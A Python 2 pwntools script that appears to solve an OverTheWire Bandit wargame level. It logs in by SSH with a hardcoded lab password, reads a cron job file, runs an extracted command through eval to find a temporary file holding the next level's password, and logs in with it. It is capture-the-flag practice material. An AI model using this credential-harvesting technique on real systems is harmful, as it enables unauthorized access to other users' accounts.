#!/bin/python2

import pwn

user = "bandit22"
host = "bandit.labs.overthewire.org"
passwd = "Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI"
port = 2220

cmd = """  
cat "/tmp/$(
    eval "$(
        cat "$(
            cat /etc/cron.d/cronjob_bandit23 | 
            tr ' ' '\n' |
            grep .sh | head -1 
        )" | 
        head -4 | 
        tail -1 | 
        cut -d "(" -f 2 | 
        rev | 
        cut -c 2- | 
        rev |  
        sed "s/\$myname/bandit23/g"
    )"
)"
"""

shell = pwn.ssh(user, host, port, passwd)
new_passwd = shell.run(cmd).recv().strip()

shell.close()

shell = pwn.ssh("bandit23", host, port, new_passwd)

print shell.ls()
